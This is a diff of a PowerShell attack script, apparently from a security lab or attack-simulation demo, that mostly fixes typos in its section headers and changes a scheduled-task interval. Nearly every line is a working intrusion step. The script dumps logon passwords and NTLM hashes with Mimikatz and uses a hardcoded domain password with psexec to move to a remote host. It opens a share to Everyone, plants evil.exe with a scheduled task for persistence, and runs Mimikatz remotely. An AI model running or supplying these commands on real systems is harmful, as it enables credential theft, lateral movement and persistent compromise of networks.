@@ -1,4 +1,4 @@
-"Inital access"
+"Initial  access"
 whoami
 hostname
 cd c:\
@@ -23,7 +23,8 @@ get-content user_group.txt
 c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern "\*\s+(Username|Domain|NTLM)\s+: .*" > c:\exploit\mimiout.txt
 get-content mimiout.txt
 
-"remotly run"
+"Remotely  run"
+
 "Create Share"
 $password = 'Cato2023!'
 $user = "sec.content\danny"
@@ -32,16 +33,16 @@ $cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\defender-win10 cmd.exe /c net share exploit=c:\exploit /grant:Everyone,FULL " -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
 
-"Creating precistance"
+"Creating Persistence"
 xcopy c:\exploit\evil.exe z:\ /E /y
 dir z:\
-Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 1 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 360 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden -WorkingDirectory "C:\Windows\sytem32"
 
 "Copy Mimikatz"
 net use z: \\defender-win10\exploit
 xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y
 dir z:\mimikatz
-"Run Mimikatz"
+"Run Mimikatz On Remote PC"
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\defender-win10 powershell -command `"c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debig sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+:.*' > c:\exploit\mimiout.txt`"" -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
 dir c:\exploit
 get-content mimiout.txt
